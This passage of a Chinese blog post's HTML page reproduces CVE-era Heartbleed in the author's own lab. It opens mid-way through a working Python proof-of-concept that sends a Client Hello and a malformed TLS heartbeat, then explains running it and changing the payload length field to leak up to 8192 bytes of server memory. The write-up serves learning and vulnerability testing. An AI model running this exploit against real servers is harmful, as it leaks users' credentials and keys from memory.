class="number">16</span>]]</span><br><span class="line">        hxdat = <span class="string">' '</span>.join(<span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        pdat = <span class="string">''</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= ord(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span><span class="params">(s, length, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = <span class="string">''</span></span><br><span class="line">    remain = length</span><br><span class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">        rtime = endtime - time.time() </span><br><span class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            <span class="comment"># EOF?</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    <span class="keyword">return</span> rdata</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span><span class="params">(s)</span>:</span></span><br><span class="line">    hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record header - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    typ, ver, ln = struct.unpack(<span class="string">'&gt;BHH'</span>, hdr)</span><br><span class="line">    pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record payload - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))</span><br><span class="line">    <span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.send(hb)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</span><br><span class="line">        options.print_help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Look for server hello done message.</span></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p>可以把该文件改为可进行文件     执行chmod a+x 该文件名。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-e7fd92a3e5ffc46c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>如果在扫描的末尾出现了下列语句说明存在该漏洞。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-45d2b5431b60dfcc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>由于自己搭建的服务器什么都没有，所以也没有读取到什么信息。</p>
+<h3 id="进一步理解heartbleed的漏洞原理"><a href="#进一步理解heartbleed的漏洞原理" class="headerlink" title="进一步理解heartbleed的漏洞原理"></a>进一步理解heartbleed的漏洞原理</h3><p>心跳包说明<br>18 : hearbeat record<br>03 02 : TLS version<br>00 03 : length<br>01 : hearbeat request<br>40 00 : payload 长度<br>“HeartbeatMessage的总长度不得超过2 ^ 14，即40 00”，有效字节大小为16384bytes<br>在这里我修改了长度为2000。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-96cc6bb57dacc02d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-97dfd4dcacedc6e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>在这种情况下返回的心跳包大小为8192bytes，之后我又修改为40 00。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-24b8c32dc01729b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-760842c8e13e598c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>在这里会显示错误，字长超过了有效字长。</p>
+<h3 id="heartbleed漏洞的风险是什么"><a href="#heartbleed漏洞的风险是什么" class="headerlink" title="heartbleed漏洞的风险是什么"></a>heartbleed漏洞的风险是什么</h3><p>如果你进行了一些敏感操作，敏感信息就会存在与内存之中，这时候别人就可以利用heartbleed漏洞对内存的信息进行提取，这样你的信息就有可能被别人获取，如果你的银行卡帐号密码被获取了，你就有可能面临财产的损失。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://yoursite.com/2018/02/04/webs3-4/" data-title="heartbleed漏洞复现与利用问题 | 让子弹飞一会" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/02/04/webs3-3/"  title="struts2-052漏洞学习">
+ <strong>下一篇：</strong><br/> 
+ <span>struts2-052漏洞学习
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解漏洞"><span class="toc-number">1.</span> <span class="toc-text">了解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heartbleed漏洞是什么？"><span class="toc-number">1.1.</span> <span class="toc-text">heartbleed漏洞是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#它的基本背景和影响是什么？"><span class="toc-number">1.2.</span> <span class="toc-text">它的基本背景和影响是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">分析漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码中那些地方出现了问题？"><span class="toc-number">2.1.</span> <span class="toc-text">源码中那些地方出现了问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"><span class="toc-number">2.2.</span> <span class="toc-text">从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞的复现与利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞的复现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置openssl，如何安装，如何解决系统自带openssl；"><span class="toc-number">3.1.</span> <span class="toc-text">安装配置openssl，如何安装，如何解决系统自带openssl；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置Apache（PHP），如何让Apache与openssl连接；"><span class="toc-number">3.2.</span> <span class="toc-text">安装配置Apache（PHP），如何让Apache与openssl连接；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用openssl生成证书并修改Apache配置，实现https访问；"><span class="toc-number">3.3.</span> <span class="toc-text">利用openssl生成证书并修改Apache配置，实现https访问；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用poc进行攻击，实现预期目标；"><span class="toc-number">3.4.</span> <span class="toc-text">利用poc进行攻击，实现预期目标；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进一步理解heartbleed的漏洞原理"><span class="toc-number">3.5.</span> <span class="toc-text">进一步理解heartbleed的漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heartbleed漏洞的风险是什么"><span class="toc-number">3.6.</span> <span class="toc-text">heartbleed漏洞的风险是什么</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+
+  
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://luckyjq.github.io/" target="_blank" title="LuckyQ">LuckyQ</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://rliyuqing.github.io/" target="_blank" title="折戟">折戟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://teazmh.github.io/" target="_blank" title="Tea_Mh">Tea_Mh</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://hok1.github.io/" target="_blank" title="Hok">Hok</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m yfzheng in XD. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="yfzheng">yfzheng</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
